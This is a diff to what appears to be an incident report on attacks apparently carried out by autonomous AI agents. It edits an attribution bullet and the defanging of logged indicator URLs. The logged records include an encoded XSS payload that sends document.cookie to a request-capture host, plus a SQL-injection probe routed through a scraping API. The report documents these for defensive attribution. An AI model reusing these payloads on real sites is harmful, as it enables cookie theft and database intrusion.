@@ -63,7 +63,7 @@ We observed automated activity consistent with AI agents operating with little o
 
 Each claim gives its layer, label (Confirmed, Suspected, Possible, Unattributed), tag (Observed, Documented, Inference, Conclusion) and the strongest evidence it rests on. A developer is named only on evidence at least as strong as: identifiers shared with a confirmed incident. Harness and model-family candidates are never named in public.
 
-- **1.1 runtime** (hosting network). 1 record(s) carry the runtime marker `via: 1.1 edge (apachetrafficserver/9.2)` (rule header.via_ats). Label: Suspected; tag: Observed. A host is not necessarily the developer.
+- **runtime marked by header.via_ats** (hosting network). 1 record(s) carry the runtime marker `via: 1.1 edge (apachetrafficserver/9.2)` (rule header.via_ats). Label: Suspected; tag: Observed. A host is not necessarily the developer.
 - Some requests name a model or vendor. That is not attribution: agents misreport who built them, and anyone can submit such a string to a public scanner.
 
 **Harness and framework candidates** (ranked; never named as the source in public):
@@ -199,7 +199,7 @@ For each cluster, the window to search, what its times measure, and the strings 
 
 URLs are defanged. Records are listed by evidence strength.
 
-1. 2026-08-07 12:00:00 UTC: `hxxps://records[.]agency[.]example/search?q=%3Cscript%3Efetch(%27//c0ve7x9[.]m[.]pipedream[.]net/?c=%27%2Bdocument.cookie)%3C/script%3E`
+1. 2026-08-07 12:00:00 UTC: `hxxps://records[.]agency[.]example/search?q=%3Cscript%3Efetch(%27//c0ve7x9[.]m[.]pipedream[.]net/?c=%27%2Bdocument[.]cookie)%3C/script%3E`
    - rules: carrier.inline_fetch_program, carrier.html_program, exfil.requestbin, exfil.cookie, exploit.xss
 1. 2026-08-13 09:00:00 UTC: `hxxps://app[.]scrapingbee[.]com/api/v1/?api_key=YOUR_API_KEY&url=https%3A%2F%2Frecords[.]agency[.]example%2Fitems%3Fid%3D1%2527`
    - rules: relay.scrape_api, marker.placeholder, exploit.double_encoded_meta, exploit.sqli_quote
